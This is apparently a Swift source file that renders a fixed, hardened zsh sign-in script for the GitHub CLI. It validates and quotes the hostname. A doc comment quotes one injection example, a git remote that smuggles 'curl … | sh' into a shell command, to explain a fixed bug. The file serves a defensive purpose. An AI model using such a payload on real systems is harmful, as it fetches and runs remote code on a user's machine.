import Foundation

/// The body of the `.command` file the `gh` sign-in action hands to Terminal (PLAN.md §3's answer
/// for a Mac where `gh` is installed but not signed in).
///
/// It lives in Core, and it is a pure function of the resolved `gh` path, for one reason: this file
/// is the only place in BranchBar where a string becomes shell source, so it has to be renderable
/// and *runnable* from a test. `Actions.writeSignInScript` writes what this returns and nothing
/// else.
///
/// **Why the host is not in here.** Before the codex review the script interpolated
/// `gh auth login --hostname \(host)` straight into zsh, and `host` came from `remote.origin.url`
/// — repo-owned data. A remote of `https://github.com;curl https://x/p|sh/o/n` therefore became a
/// command a click ran (codex BLOCKER 1). Three things now stand between a remote and this shell:
///
/// 1. `GitHubSlug.isValidHostname` refuses a host that is not a hostname at parse time, so a
///    hostile remote never reaches a slug, a notice, or an action payload.
/// 2. The script's text is fixed. The hostname arrives as *data*, in the sibling file
///    `gh-sign-in.host`, read with a command substitution that never re-evaluates what it read.
/// 3. The script re-checks that hostname in zsh against the same grammar, and exits 1 on a miss,
///    so a tampered `gh-sign-in.host` is refused by the shell as well as by Swift.
///
/// The hostname then reaches `gh` as one argv element of a quoted expansion, which is what the
/// security contract in PLAN.md §6 promises for every other invocation in the app.
public enum SignInScript {

    /// The file Terminal opens. `.command` is the extension Terminal claims as a document type,
    /// which is what makes this an ordinary file open rather than an Apple Event (see
    /// `Actions.openTerminalForSignIn`).
    public static let scriptFileName = "gh-sign-in.command"

    /// The sibling file holding exactly one validated hostname on its first line.
    public static let hostFileName = "gh-sign-in.host"

    /// The zsh half of `GitHubSlug.isValidHostname`, written against the lower-cased form the slug
    /// stores. Single-quoted at the `=~` so zsh passes the pattern to the regex engine intact.
    public static let hostnamePattern =
        "^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$"

    /// `ghPath` is `ToolLocator`'s absolute path, never PATH: the GUI app's PATH is
    /// `/usr/bin:/bin:/usr/sbin:/sbin` and Homebrew is not on it (CLAUDE.md). It is single-quoted
    /// even so — the script names no path it did not resolve itself.
    public static func render(ghPath: String) -> String {
        """
        #!/bin/zsh
        # Written by BranchBar. Every line below is fixed text: the only value that varies is the
        # hostname, which is read from \(hostFileName) beside this file and re-checked here.
        emulate -L zsh
        set -u

        gh=\(singleQuoted(ghPath))
        dir=${0:A:h}
        hostfile=$dir/\(hostFileName)

        if [[ ! -f $hostfile ]]; then
          print -r -- 'BranchBar: no hostname file beside this script, so there is nothing to sign in to.'
          exit 1
        fi

        host=$(head -n 1 -- "$hostfile")
        host=${host%%$'\\r'}

        if [[ ! $host =~ '\(hostnamePattern)' ]]; then
          print -r -- 'BranchBar: that is not a hostname, so nothing was run.'
          exit 1
        fi

        print -r -- \(singleQuoted(Strings.ghSignInScriptBanner))
        print
        print -r -- "$ $gh auth login --hostname $host"
        exec "$gh" auth login --hostname "$host"

        """
    }

    /// One shell word, quoted the only way that has no escapes inside it: everything is literal
    /// between single quotes, and a single quote itself is spelled by closing, escaping, reopening.
    static func singleQuoted(_ value: String) -> String {
        "'" + value.replacingOccurrences(of: "'", with: "'\\''") + "'"
    }
}
